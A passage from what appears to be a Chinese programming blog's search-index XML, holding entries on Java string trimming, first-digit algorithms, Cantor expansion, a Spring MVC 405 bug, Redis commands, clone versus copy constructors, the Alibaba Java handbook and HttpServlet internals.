StringUtils.equalsAny(val[len - 1] + "", (char) (32) + "", (char) (160) + "", (char) (12288) + "")) &#123; len--; &#125; return ((st &gt; 0) || (len &lt; val.length)) ? str.substring(st, len) : str; &#125;&#125;]]></content>
      <categories>
        <category>Java SE</category>
      </categories>
      <tags>
        <tag>最佳实践</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[如何高效的获取一个数字的首位数字]]></title>
    <url>%2Fposts%2FHow_to_efficiently_get_the_first_digit_of_a_number.html</url>
    <content type="text"><![CDATA[前言一直以来都是通过转化为String的方式来获得首位数字, 但是直觉告诉我, 这个肯定不是最高效的。在stackoverflow上找到了这篇文章。虽然看标题是C#的, 但是算法没有语言之分。同样适用于javaHow can you get the first digit in an int (C#)? 解法(效率从低到高)转化为字符串1int firstDigit = String.valueOf(num).charAt(0) - '0'; Result: 9,165,089 ticks 循环除10123while(num &gt;= 10)&#123; num = 10;&#125; Results: 6,001,570 ticks 暴力if因为int的取值范围有限, 所以可以使用这种暴力枚举的方法。123456789101112131415161718192021int firstdigit;if (num &lt; 10) firstdigit = num;else if (num &lt; 100) firstdigit = num / 10;else if (num &lt; 1000) firstdigit = num / 100;else if (num &lt; 10000) firstdigit = num / 1000;else if (num &lt; 100000) firstdigit = num / 10000;else if (num &lt; 1000000) firstdigit = num / 100000;else if (num &lt; 10000000) firstdigit = num / 1000000;else if (num &lt; 100000000) firstdigit = num / 10000000;else if (num &lt; 1000000000) firstdigit = num / 100000000;else firstdigit = num / 1000000000; Results: 1,421,659 ticks 二分if因为int的取值范围有限, 所以可以使用这种暴力枚举的方法。对上面的暴力枚举使用二分法进行优化。1234if (num &gt;= 100000000) num /= 100000000;if (num &gt;= 10000) num /= 10000;if (num &gt;= 100) num /= 100;if (num &gt;= 10) num /= 10; Results: 1,399,788 ticks 参考资料 How can you get the first digit in an int (C#)?]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>最佳实践</tag>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[为什么jQuery选择器只返回一个元素?]]></title>
    <url>%2Fposts%2Fwhy_jQuery_selector_return_only_one_element.html</url>
    <content type="text"><![CDATA[前言稍有常识的人都知道, 如果我们使用形如$(&#39;p&#39;)、$(&#39;.myclass&#39;)之类的选择器，会返回一个数组。但今天在必应中进行控制台js调试时, 却发现不管怎么用, 都只返回第一个元素。 Chrome的坑Why does jQuery class selector only return one element?提到该网页根本没有引入jQuery。在F12控制台中, $其实是debugger调试器的快捷方式document.querySelector()。如果想要获取所有元素的话, 使用$$(.myclass)即可。 检查页面是否引入jQuery使用console.log($)调试。如果引入了jQuery, 则输出1function (a,b)&#123;return new n.fn.init(a,b)&#125; 如果没有引入jQuery, 则输出1function $(selector, [startNode]) &#123; [Command Line API] &#125; 参考资料 Why does jQuery class selector only return one element?提到 google developers]]></content>
      <categories>
        <category>JavaScript</category>
      </categories>
      <tags>
        <tag>jQuery</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[康托展开]]></title>
    <url>%2Fposts%2Fcantor_algorithm.html</url>
    <content type="text"><![CDATA[介绍康托展开是一个全排列到一个自然数的双射, 常用于构建哈希表时的空间压缩, 康托展开的实质是计算当前排列在所有由小到大全排列中的顺序，因此是可逆的。 运算3 5 7 4 1 2 9 6 8展开为98884。98884 = 2*8!+3*7!+4*6!+2*5!+0*4!+0*3!+2*2!+0*1!+0*0!排列的第一位是3，比3小的数有两个，以这样的数开始的排列有8!个，因此第一项为28!排列的第二位是5，比5小的数有1、2、3、4，由于3已经出现，因此共有3个比5小的数，这样的排列有7!个，因此第二项为37!以此类推，直至0*0! 逆运算如n=5,x=96时：首先用96-1得到95，说明x之前有95个排列.(将此数本身减去1)用95去除4! 得到3余23，说明有3个数比第1位小，所以第一位是4.用23去除3! 得到3余5，说明有3个数比第2位小，所以是4，但是4已出现过，因此是5.用5去除2!得到2余1，类似地，这一位是3.用1去除1!得到1余0，这一位是2.最后一位只能是1.所以这个数是45321. java 代码实现12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394public class MathUtils &#123; public static Integer[] factorial = new Integer[11]; static&#123; factorial[0] = 0; factorial[1] = 1; for(int i = 2, len = factorial.length; i &lt; len; i++)&#123; factorial[i] = factorial[i-1]*i; &#125; &#125; /** * 将cantor逆康托展开, 返回一个全排列 * 如[1,2,3],1 * 如[3,2,1],6 * @param sequence 全排列中的元素序列 * @param cantor 康拓展开值 * @return 全排列 */ public static int[] deCantor(int[] sequence, int cantor)&#123; int len = sequence.length; if(len&gt;10)&#123; throw new IllegalArgumentException("确保"+len+"不大于10"); &#125; if(cantor&lt;=0 || cantor&gt;factorial[len])&#123; throw new IllegalArgumentException("确保"+cantor+"在[0,"+factorial[len]+""); &#125; Arrays.sort(sequence); int[] num = new int[len]; boolean[] mark = new boolean[len]; cantor--; len--; int idx = 0; while(len!=0)&#123; int k = cantor/factorial[len]; for(int i = 0; i &lt;= k; i++)&#123; if(mark[i])&#123; k++; &#125; &#125; num[idx++] = sequence[k]; mark[k] = true; cantor %= factorial[len--]; &#125; for(int i = 0, k = mark.length; i&lt;k; i++)&#123; if(!mark[i])&#123; num[k-1] = sequence[i]; break; &#125; &#125; return num; &#125; /** * 返回chars[]在全排列中是第几大的排列 * 如[1,2,3]返回1 * 如[3,2,1]返回6 * @param chars 全排列 * @return 康托展开的值 */ public static int enCantor(int... chars) &#123; int len = chars.length; if(len&gt;10)&#123; throw new IllegalArgumentException("确保"+len+"不大于10"); &#125; int[] low = new int[len]; for (int i = 0; i &lt; len; i++) &#123; for (int j = i+1; j &lt; len; j++) &#123; if(chars[j]&lt;chars[i] &amp;&amp; j&gt;i)&#123; low[i]++; &#125; &#125; &#125; int num = 0; for (int i = 0; i &lt; len; i++) &#123; num += low[i] == 0 ? 0 : low[i] * factorial[len-1-i]; &#125; return num+1; &#125; public static BigInteger factorial(int n)&#123; int len = factorial.length; if(n&lt;len)&#123; return BigInteger.valueOf(factorial[n]); &#125; BigInteger result = BigInteger.valueOf(factorial[len-1]); for(int i = len; i &lt;= n; i++)&#123; result = result.multiply(BigInteger.valueOf(i)); &#125; return result; &#125;&#125; 参考资料 康托展开-维基百科]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[记一次SpringMVC访问静态资源405错误修复]]></title>
    <url>%2Fposts%2Fwhy_Spring_MVC_ask_the_static_resource_return_405.html</url>
    <content type="text"><![CDATA[前言访问静态资源出现405错误1警告 [http-nio-8080-exec-8] org.springframework.web.servlet.PageNotFound.handleHttpRequestMethodNotSupported Request method &apos;GET&apos; not supported 1234HTTP Status 405 - Request method &apos;GET&apos; not supportedtype Status reportmessage Request method &apos;GET&apos; not supporteddescription The specified HTTP method is not allowed for the requested resource. stackoverflow解释开启DefaultServletHandlerConfigurer或者配置ResourceHandler二选一123456789101112public class WebConfig extends WebMvcConfigurerAdapter &#123; @Override public void configureDefaultServletHandling(DefaultServletHandlerConfigurer configurer) &#123; configurer.enable(); &#125; // @Override// public void addResourceHandlers(ResourceHandlerRegistry registry) &#123;// registry.addResourceHandler("/static/**").addResourceLocations("/static/**");// &#125;&#125; 使用1@RequestMapping(value = &quot;/path&quot;, method = RequestMethod.GET) 替换1@RequestMapping(value = &quot;/path&quot;, method = RequestMethod.POST) 问题是第一步我明显配置好的了。第二步我还不至于犯这么低级的错误(事实上就是这么低级的错误) 修bug之路 以为是IDEA的bug, 像Android Studio一样, 需要隔三差五的ReBuild一下。(405) 删除项目目录下的out和target文件夹, 重新编译运行。(405) 新建项目, 将Initializer、WebConfig复制到新项目, 编译运行。(成功) 将全部代码复制一遍到新目录。(405) 将所有@Compontent注释, 保留一个简单的HelloWorld的@Controller。(成功) 一个个@Compontent恢复，终于找到bug所在。 问题所在我在之前添加了个PostMapping, 加上了TODO后, 就忘记这件事了。之后就开始出现访问静态资源405错误。页面能正常打开，就是样式丢失。123456789@Controllerpublic class UserController&#123; // 省略其他代码 @PostMapping() public String addUser()&#123; //TODO 增加用户 return ""; &#125;&#125; 原因就在这, name的默认值是””，会拦截所有不经过其他RequestMapping的url。静态资源也因此被拦截, 需要通过Post方式获取。123456789@Target(ElementType.METHOD)@Retention(RetentionPolicy.RUNTIME)@Documented@RequestMapping(method = RequestMethod.POST)public @interface PostMapping &#123; @AliasFor(annotation = RequestMapping.class) String name() default ""; // 省略其他代码&#125; 解决方法将这段代码注释掉, 或者将PostMapping的name设置下。123456789@Controllerpublic class UserController&#123; // 省略其他代码// @PostMapping("/admin/user")// public String addUser()&#123;// //TODO 增加用户// return "";// &#125;&#125;]]></content>
      <categories>
        <category>Java Web</category>
      </categories>
      <tags>
        <tag>Spring MVC</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Redis学习笔记]]></title>
    <url>%2Fposts%2FRedis_simple_use.html</url>
    <content type="text"><![CDATA[介绍Redis是一种NoSQL(No Only SQL) 非关系型数据库，是高性能键值对数据库。常用于缓存、分布式Session分离，或者任务队列，网站访问统计。Redis建议运行于Linux上。Java推荐JRedis 使用/usr/local/redis/bin有以下可执行文件12345678910# 性能测试工具redis-benchmark# AOF文件修复工具redis-check-aof# RDB文件检查工具redis-check-dump# 命令行客户端redis-cli# redis服务器启动命令redis-server 在/usr/local/redis/redis.conf中修改配置信息12# 允许后台启动daemonize yes 常用命令123456# 通过配置信息启动Redis, 后台启动redis/usr/local/redis/bin/redis-server /usr/local/redis/redis.conf# 进入redis控制台/usr/local/redis/bin/redis-cli# 关闭redis/usr/local/redis/bin/redis-cli shutdown 存储Redis有string、hash、list、set、sorted-set五种存储方式. 字符串存储12345678910111213set mykey value1 // 存储键值对get mykey // 输出value1getset mykey value2 // 输出value1，存入value2del mykey // 删除键为mykey的键值对，返回nilincr mykey // 自增1，若mykey不存在，则创建key为0，并自增1decr mykey // 自减1，若mykey不存在，则创建key为0，并自减1incrby mykey 5 // 自增5decrby mykey 5 // 自减5append mykey value // 在字符串末尾追加value hash存储Hash存储一个对象，对象中可以创建属性。类似Map&lt;Object, Collection&lt;Object&gt;&gt;123456789101112131415hset mykey field1 value1hmset mykey field1 value1 [fieldN valueN]hget mykey [field1]hmget mykey field1 [fieldN]hgetall mykey // 获取所有属性及属性值hdel mykey field1 [fieldN]del mykey // 删除整个key集合hincr by mykey field1 5 // key的field1属性自增5hexists mykey field1 // 判断mykey中的field1属性是否存在hlen mykey // 获取mykey中属性的数量hkeys mykey // 获取mykey中所有的属性名kvals mykey // 获取mykey中所有的属性值 list存储按插入顺序排序的字符串链表，用于消息队列123456789101112131415161718lpush mylist a b c // 往mylist左侧依次插入a b clpushx mylist a b c // 只有mylist存在才插入rpush mylist 1 2 3 // 往mylist右侧依次插入1 2 3rpushx mylist 1 2 3 // 只有mylist存在才插入lset mylist index value // 往mylist下标为index插入valuelinsert mylist before b x // 往mylist的第1个b元素之前插入xlinsert mylist after b x // 往mylist的第1个b元素之后插入xrpoplpush mylist1 mylist2 // 弹出mylist1最后一个元素插入mylist2第一个元素lpop mylist // 弹出mylist左侧的第一个元素rpop mylist // 弹出mylist右侧的第一个元素lrange mylist 0 -1 // 查看链表第0个元素到倒数第1个元素llen mylist // mylist元素个数lrem mylist 2 value // 从左往右删除2个valuelrem mylist -2 value // 从右往左删除2个valuelrem mylist 0 value // 删除所有value set存储无排序的字符集合，类似Set&lt;Object&gt;12345678910111213sadd myset a b c // 往myset中插入a b csrem myset a b // 删除元素a b smembers myset // 查看所有元素scard myset // 元素数量sismember myset a // set是否存在元素asrandmember myset // 返回set中随机一个成员sdiff myset1 myset2 // 差集运算sdiffstore myset3 myset1 myset2 // 将myset1和myset2差集运算结果存储到myset3sinter myset1 myset2 // 交集运算sinterstore myset3 myset1 myset2 // 将myset1和myset2交集运算结果存储到myset3sunion myset1 myset2 // 并集运算sunionstore myset3 myset1 myset2 // 将myset1和myset2并集运算结果存储到myset3 sorted-set存储使用分数排序的set，常用于排行榜、构建索引数据12345678910111213141516zadd myset 90 a 80 b 60 czscore myset a // 获取myset中a的分数zcard myset // 元素数量zrange myset 0 -1 // 查看myset第0个元素到倒数第1个元素zrange myset 0 -1 withscores// 包括分数，从小到大排序zrevrange myset 0 -1 withscores// 从大到小排序zrangebyscore myset 0 100 withscores limit 0 2 // 查看myset分数在0-100之间第0-2个元素zcount myset 80 90 // 分数在80-90之间的元素个数zrem myset b c // 删除元素a bzremrangebyrank myset 0 -1 // 删除myset第0个元素到倒数第1个元素zremrangebyscore myset 80 100 // 删除分数在80-100之间的元素zincrby myset 5 a // a元素自增5 keys操作这里的key，相当于关系型数据库的table1234567keys my* // 获取所有的my开头的keydel myset1 myset2 myset3 exists mysetrename myset newsetexpire myset 1000 // 1000秒后过期ttl myset // 剩余超时时间type myset // 获取myset的类型, 如string、hash、set等 数据库一个Redis实例可以提供16个数据库(下标0-15)12select 0 // 选择0号数据库(默认)move myset 1 // 移动myset到1号数据库 事务123multi // 开启事务exec // 提交事务discard // 回滚事务 持久化分为RDB持久化和AOF持久化两种 RDB持久化(默认)指定时间间隔内将数据库写入磁盘优势, 只包含一个备份文件, 性能最大化, 通过fork进程让子进程完成持久化操作, 启动效率比AOF高.劣势, 不能最大限度避免数据丢失./usr/local/redis/redis.confsave 900 1 900秒至少有一个key发生变化就持久化一次 dbfilename dump.rdbdir ./保存在当前目录的dump.rdb文件中 AOF持久化以日志形式记录服务器每次操作优势, 更高的数据安全性, 每秒同步、每修改同步、不同步, 当日志文件过大, 重写日志文件.劣势, 运行效率低1234567# 默认关闭AOF方式appendonly no# 产生日志文件名appendfilename "appendonly.aof"# appendsync alwaysappendsync everysec# appendsync no 三种同步策略]]></content>
      <categories>
        <category>Redis</category>
      </categories>
      <tags>
        <tag>Redis</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[复制构造函数与clone]]></title>
    <url>%2Fposts%2Fcopy_constructor_and_clone_method.html</url>
    <content type="text"><![CDATA[前言对一个对象的复制，通常实现Cloneable接口使用clone方法。但这有一个设计缺陷。Cloneable没有clone方法，反而在Object里面调用了native修饰的clone方法。 缺陷12public interface Cloneable &#123;&#125; 很明显看到，Cloneable是一个空接口，实现Cloneable只是为了在调用clone方法时，不抛出CloneNotSupportedException异常。而且使用的是native修饰的clone方法，对应用开发者是透明的，开发者对clone方法不可控。 使用复制构造函数解决Josh Bloch推荐使用复制构造函数来实现clone功能，实际上，HashMap也通过复制构造函数进行clone。1234567// java.util.HashMappublic class HashMap&lt;K,V&gt; extends AbstractMap&lt;K,V&gt; implements Map&lt;K,V&gt;, Cloneable, Serializable &#123; public HashMap(Map&lt;? extends K, ? extends V&gt; m) &#123; this.loadFactor = DEFAULT_LOAD_FACTOR; putMapEntries(m, false); &#125;&#125; 参考资料 Copy Constructor versus Cloning]]></content>
      <categories>
        <category>Java SE</category>
      </categories>
      <tags>
        <tag>最佳实践</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[阿里巴巴Java开发手册学习笔记]]></title>
    <url>%2Fposts%2FAlibaba_Java_Development_Handbook.html</url>
    <content type="text"><![CDATA[下载地址【Java编码规范】《阿里巴巴Java开发手册（正式版）》更新（v1.2.0版）——迄今最完善版本 编程规约命名风格 【强制】类名使用UpperCamelCase风格，类名使用 UpperCamelCase 风格，必须遵从驼峰形式。但以下情形例外。但以下情形例外： DO / BO / DTO / VO / AO正例： MarcoPolo / UserDO / XmlService / TcpUdpDeal / TaPromotion反例： macroPolo / UserDo / XMLService / TCPUDPDeal / TAPromotion 【强制】常量命名全部大写，单词间用下划线隔开，力求语义表达完整清楚，不要嫌名字长。正例： MAX _ STOCK _ COUNT反例： MAX _ COUNT 【强制】抽象类命名使用 Abstract 或 Base 开头 ； 异常类命名使用 Exception 结尾 ； 测试类命名以它要测试的类的名称开始，以 Test 结尾。 【强制】 POJO 类中布尔类型的变量，都不要加 is ，否则部分框架解析会引起序列化错误。反例：定义为基本数据类型 Boolean isDeleted; 的属性，它的方法也是 isDeleted() ，RPC框架在反向解析的时候，“以为”对应的属性名称是 deleted ，导致属性获取不到，进而抛出异常。 【强制】包名统一使用小写，点分隔符之间有且仅有一个自然语义的英语单词。包名统一使用单数形式，但是类名如果有复数含义，类名可以使用复数形式。正例： 应用工具类包名为 com.alibaba.open.util 、类名为 MessageUtils（ 此规则参考spring 的框架结构 ） 【参考】各层命名规约： 获取单个对象的方法用 get 做前缀。 获取多个对象的方法用 list 做前缀。 获取统计值的方法用 count 做前缀。 插入的方法用 save（ 推荐 ） 或 insert 做前缀。 删除的方法用 remove（ 推荐 ） 或 delete 做前缀。 修改的方法用 update 做前缀。 【参考】领域模型命名规约: 数据对象： xxxDO ， xxx 即为数据表名。 数据传输对象： xxxDTO ， xxx 为业务领域相关的名称。 展示对象： xxxVO ， xxx 一般为网页名称。 POJO 是 DO / DTO / BO / VO 的统称，禁止命名成 xxxPOJO 。 常量定义 【强制】不允许任何魔法值 （ 即未经定义的常量 ） 直接出现在代码中。反例： 12String key = " Id # taobao _" + tradeId;cache.put(key , value); 【推荐】不要使用一个常量类维护所有常量，应该按常量功能进行归类，分开维护。如：缓存相关的常量放在类： CacheConsts 下 ； 系统配置相关的常量放在类： ConfigConsts 下。说明：大而全的常量类，非得使用查找功能才能定位到修改的常量，不利于理解和维护。 一方库：本工程中的各模块的相互依赖二方库：公司内部的依赖库，一般指公司内部的其他项目发布的jar包三方库：公司之外的开源库， 比如apache、ibm、google等发布的依赖 代码格式 【强制】单行字符数限制不超过 120 个，超出需要换行，换行时遵循如下原则： 第二行相对第一行缩进 4 个空格，从第三行开始，不再继续缩进。 运算符与下文一起换行。 方法调用的点符号与下文一起换行。 在多个参数超长，在逗号后换行。 在括号前不要换行。 【强制】 IDE 的 text file encoding 设置为 UTF -8; IDE 中文件的换行符使用 Unix格式，不要使用 windows 格式。 【推荐】没有必要增加若干空格来使某一行的字符与上一行对应位置的字符对齐。 OOP规约 关于基本数据类型与包装数据类型的使用标准如下： 【强制】所有的 POJO 类属性必须使用包装数据类型。 【强制】 RPC 方法的返回值和参数必须使用包装数据类型。 【推荐】所有的局部变量使用基本数据类型。说明： POJO 类属性没有初值是提醒使用者在需要使用时，必须自己显式地进行赋值，任何NPE 问题，或者入库检查，都由使用者来保证。正例：数据库的查询结果可能是 null ，因为自动拆箱，用基本数据类型接收有 NPE 风险。反例：比如显示成交总额涨跌情况，即正负 x %， x 为基本数据类型，调用的 RPC 服务，调用不成功时，返回的是默认值，页面显示：0%，这是不合理的，应该显示成中划线-。所以包装数据类型的 null 值，能够表示额外的信息，如：远程调用失败，异常退出。 【强制】定义 DO / DTO / VO 等 POJO 类时，不要设定任何属性默认值。反例： POJO 类的 gmtCreate 默认值为 new Date(); 但是这个属性在数据提取时并没有置入具体值，在更新其它字段时又附带更新了此字段，导致创建时间被修改成当前时间。 【强制】构造方法里面禁止加入任何业务逻辑，如果有初始化逻辑，请放在 init 方法中。 【推荐】 类内方法定义顺序依次是：公有方法或保护方法 &gt; 私有方法 &gt; getter / setter方法。说明：公有方法是类的调用者和维护者最关心的方法，首屏展示最好 ； 保护方法虽然只是子类关心，也可能是“模板设计模式”下的核心方法 ； 而私有方法外部一般不需要特别关心，是一个黑盒实现 ； 因为方法信息价值较低，所有 Service 和 DAO 的 getter / setter 方法放在类体最后。 集合处理 【强制】泛型通配符&lt;? extends T &gt;来接收返回的数据，此写法的泛型集合不能使用 add 方法，而 &lt;? super T&gt; 不能使用 get 方法，做为接口调用赋值时易出错。说明：扩展说一下 PECS(Producer Extends Consumer Super)原则：1）频繁往外读取内容的，适合用上界 Extends 。2）经常往里插入的，适合用下界 Super 。 【推荐】集合初始化时，指定集合初始值大小。正例： initialCapacity = (需要存储的元素个数 / 负载因子) + 1。注意负载因子（即loaderfactor）默认为 0.75， 如果暂时无法确定初始值大小，请设置为 16。 并行处理 【强制】线程池不允许使用 Executors 去创建，而是通过 ThreadPoolExecutor 的方式，这样的处理方式让写的同学更加明确线程池的运行规则，规避资源耗尽的风险。说明： Executors 返回的线程池对象的弊端如下： FixedThreadPool 和 SingleThreadPool :允许的请求队列长度为 Integer.MAX_VALUE ，可能会堆积大量的请求，从而导致 OOM 。 CachedThreadPool 和 ScheduledThreadPool :允许的创建线程数量为 Integer.MAX_VALUE ，可能会创建大量的线程，从而导致 OOM 。 【强制】 SimpleDateFormat 是线程不安全的类，一般不要定义为 static 变量，如果定义为static ，必须加锁，或者使用 DateUtils 工具类。正例：注意线程安全，使用 DateUtils 。亦推荐如下处理： 123456private static final ThreadLocal&lt;DateFormat&gt; df = new ThreadLocal&lt;DateFormat&gt;() &#123; @ Override protected DateFormat initialValue() &#123; return new SimpleDateFormat("yyyy-MM-dd"); &#125;&#125;; 说明：如果是 JDK 8 的应用，可以使用 Instant 代替 Date ， LocalDateTime 代替 Calendar ，DateTimeFormatter 代替 Simpledateformatter ，官方给出的解释： simple beautiful strong immutable thread - safe 。 【强制】多线程并行处理定时任务时， Timer 运行多个 TimeTask 时，只要其中之一没有捕获抛出的异常，其它任务便会自动终止运行，使用 ScheduledExecutorService 则没有这个问题。 其他 【强制】后台输送给页面的变量必须加 $!{var} ——中间的感叹号。说明：如果 var = null 或者不存在，那么 ${var} 会直接显示在页面上。 异常日志日志规约 【强制】日志文件推荐至少保存 15 天，因为有些异常具备以“周”为频次发生的特点。 【强制】避免重复打印日志，浪费磁盘空间，务必在 log4j.xml 中设置 additivity = false 。正例： &lt;logger name=&quot;com.taobao.dubbo.config&quot; additivity=&quot;false&quot;&gt; MySQL数据库建表规约 【强制】表达是与否概念的字段，必须使用 is _ xxx 的方式命名，数据类型是 unsigned tinyint（ 1 表示是，0 表示否 ） 。 【强制】主键索引名为 pk_ 字段名；唯一索引名为 uk _字段名 ； 普通索引名则为 idx _字段名。 【强制】小数类型为 decimal ，禁止使用 float 和 double 。说明： float 和 double 在存储的时候，存在精度损失的问题，很可能在值的比较时，得到不正确的结果。如果存储的数据范围超过 decimal 的范围，建议将数据拆成整数和小数分开存储。 【强制】表必备三字段： id , gmt _ create , gmt _ modified。说明：其中 id 必为主键，类型为 unsigned bigint 、单表时自增、步长为 1。 gmt _ create ,gmt _ modified 的类型均为 date _ time 类型。 索引规约 【强制】 超过三个表禁止 join 。需要 join 的字段，数据类型必须绝对一致 ；多表关联查询时，保证被关联的字段需要有索引。说明：即使双表 join 也要注意表索引、 SQL 性能。 【强制】在 varchar 字段上建立索引时，必须指定索引长度，没必要对全字段建立索引，根据实际文本区分度决定索引长度即可。说明：索引的长度与区分度是一对矛盾体，一般对字符串类型数据，长度为 20 的索引，区分度会高达 90%以上，可以使用 count(distinct left( 列名, 索引长度 )) / count( * ) 的区分度来确定。 【强制】页面搜索严禁左模糊或者全模糊，如果需要请走搜索引擎来解决。说明：索引文件具有 B - Tree 的最左前缀匹配特性，如果左边的值未确定，那么无法使用此索引。 【推荐】利用延迟关联或者子查询优化超多分页场景。说明： MySQL 并不是跳过 offset 行，而是取 offset + N 行，然后返回放弃前 offset 行，返回N 行，那当 offset 特别大的时候，效率就非常的低下，要么控制返回的总页数，要么对超过特定阈值的页数进行 SQL 改写。正例：先快速定位需要获取的 id 段，然后再关联：SELECT a.* FROM 表 1 a, (select id from 表 1 where 条件 LIMIT 100000,20 ) b where a.id=b.id 【推荐】建组合索引的时候，区分度最高的在最左边。正例：如果 where a =? and b =? ， a 列的几乎接近于唯一值，那么只需要单建 idx _ a 索引即可。说明：存在非等号和等号混合判断条件时，在建索引时，请把等号条件的列前置。如： where a &gt;? and b =?那么即使 a 的区分度更高，也必须把 b 放在索引的最前列。 SQL语句 【强制】不要使用 count(列名) 或 count(常量) 来替代 count(*) ， count(*) 是SQL92定义的标准统计行数的语法，跟数据库无关，跟 NULL 和非 NULL 无关。说明： count(*) 会统计值为 NULL 的行，而 count(列名) 不会统计此列为 NULL 值的行。 【强制】当某一列的值全是 NULL 时， count(col) 的返回结果为 0，但 sum(col) 的返回结果为NULL ，因此使用 sum() 时需注意 NPE 问题。正例：可以使用如下方式来避免 sum 的 NPE 问题： SELECT IF(ISNULL(SUM(g)) ,0, SUM(g)) FROM table; 【强制】不得使用外键与级联，一切外键概念必须在应用层解决。说明： （ 概念解释 ） 学生表中的 student _ id 是主键，那么成绩表中的 student _ id 则为外键。如果更新学生表中的 student _ id ，同时触发成绩表中的 student _ id 更新，则为级联更新。外键与级联更新适用于单机低并发，不适合分布式、高并发集群 ； 级联更新是强阻塞，存在数据库更新风暴的风险；外键影响数据库的插入速度。 【强制】禁止使用存储过程，存储过程难以调试和扩展，更没有移植性。 【强制】数据订正时，删除和修改记录时，要先 select ，避免出现误删除，确认无误才能执行更新语句。]]></content>
      <categories>
        <category>Java SE</category>
      </categories>
      <tags>
        <tag>最佳实践</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[HttpServlet源码详解]]></title>
    <url>%2Fposts%2FHttpServlet_source_code.html</url>
    <content type="text"><![CDATA[前言Servlet是Servlet+Applet的缩写，表示一个服务器应用。Servlet是一个接口，是javaweb开发的一套规范。 继承树 GenericServlet详解GenericServlet是与具体协议无关的。可以看到GenericServlet是一个抽象类，实现了Servlet和ServletConfig接口。12345public abstract class GenericServlet implements Servlet, ServletConfig, java.io.Serializable&#123; private transient ServletConfig config; /** 省略部分代码 */&#125; Servlet接口在GenericServlet中的实现先看Servlet接口，它实现了以下方法。123456789public interface Servlet &#123; public void init(ServletConfig config); // Web容器调用时，初始化方法，只调用一次 public void destroy(); // 关闭Web容器时销毁，只调用一次 public ServletConfig getServletConfig(); // 暴露获取ServletConfig对象的方法 // 容器注入request和response，处理业务 public void service(ServletRequest req, ServletResponse res); public String getServletInfo(); // 获取Servlet的信息，如作者，版权等。&#125; 根据这些方法，在GenericeServlet中找到其实现。主要是对init进行了实现。1234567891011121314151617181920212223public abstract class GenericServlet implements Servlet, ServletConfig, java.io.Serializable&#123; /** 省略部分代码 */ private transient ServletConfig config; // 在序列化时，不对transient修饰的field进行序列化。 public void init(ServletConfig config) throws ServletException &#123; this.config = config; // 获取Web容器注入的ServletConfig对象 this.init(); &#125; public void init() throws ServletException &#123; // 使用模板方法模式，自定义一个无参的init方法，并暴露给子类实现。 &#125; public ServletConfig getServletConfig() &#123; return config; // 暴露获取ServletConfig对象的方法 &#125; public void destroy() &#123;&#125; public String getServletInfo() &#123; return ""; &#125; public abstract void service(ServletRequest req, ServletResponse res);&#125; ServletConfig接口在GenericServlet中的实现先看ServletConfig接口，它实现了以下方法。123456public interface ServletConfig &#123; public String getServletName(); // 获取Servlet的名字，即web.xml中&lt;servlet-name&gt;的值 public ServletContext getServletContext(); // 暴露获取ServletContext对象的方法 public String getInitParameter(String name); // 根据name获取初始化参数，即web.xml中&lt;context-param&gt;的键值对 public Enumeration&lt;String&gt; getInitParameterNames(); // 获取所有的&lt;context-param&gt;的键值对&#125; 根据这些方法，在GenericeServlet中找到其实现。全部都是通过ServletConfig对象进行实现的，而ServletConfig是由Web容器注入的,由Servlet实现。12345678910111213141516public abstract class GenericServlet implements Servlet, ServletConfig, java.io.Serializable&#123; /** 省略部分代码 */ public String getServletName() &#123; return getServletConfig().getServletName(); &#125; public ServletContext getServletContext() &#123; return getServletConfig().getServletContext(); &#125; public String getInitParameter(String name) &#123; return getServletConfig().getInitParameter(name); &#125; public Enumeration&lt;String&gt; getInitParameterNames() &#123; return getServletConfig().getInitParameterNames(); &#125; &#125; HttpServlet详解很明显，GenericServlet只留下了service这个方法给HttpServlet进行重写。并根据不同的请求类型，调用不同的doXxx方法。doXxx必须重写，否则在调用时会出现异常。123456789101112131415161718192021222324252627282930313233public abstract class HttpServlet extends GenericServlet&#123; /** 省略部分代码 */ @Override public void service(ServletRequest req, ServletResponse res)&#123; HttpServletRequest request = (HttpServletRequest) req; HttpServletResponse response = (HttpServletResponse) res; service(request, response); &#125; /** 核心方法 */ protected void service(HttpServletRequest req, HttpServletResponse resp) &#123; String method = req.getMethod(); // 获取请求类型 // 根据请求类型，调用不同的doXxx方法 if (method.equals(METHOD_GET)) &#123; doGet(req, resp); &#125; else if (method.equals(METHOD_HEAD)) &#123; doHead(req, resp); &#125; else if (method.equals(METHOD_POST)) &#123; doPost(req, resp); &#125; else if (method.equals(METHOD_PUT)) &#123; doPut(req, resp); &#125; else if (method.equals(METHOD_DELETE)) &#123; doDelete(req, resp); &#125; else if (method.equals(METHOD_OPTIONS)) &#123; doOptions(req,resp); &#125; else if (method.equals(METHOD_TRACE)) &#123; doTrace(req,resp); &#125; else &#123; // &#125; &#125;&#125; Http的各种请求类型 请求类型 作用 Get Post Put Delete Head 调用doGet方法，返回空body的Response Options 调试工作，返回所有支持的处理类型的集合 Trace 调试工作，远程诊断服务器，将接收到的header原封不动地返回]]></content>
      <categories>
        <category>Java Web</category>
      </categories>
      <tags>
        <tag>Servlet</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[java8函数式编程Lambda表达式]]></title>
    <url>%2Fposts%2Fjava8_lambda_foundation.html</url>
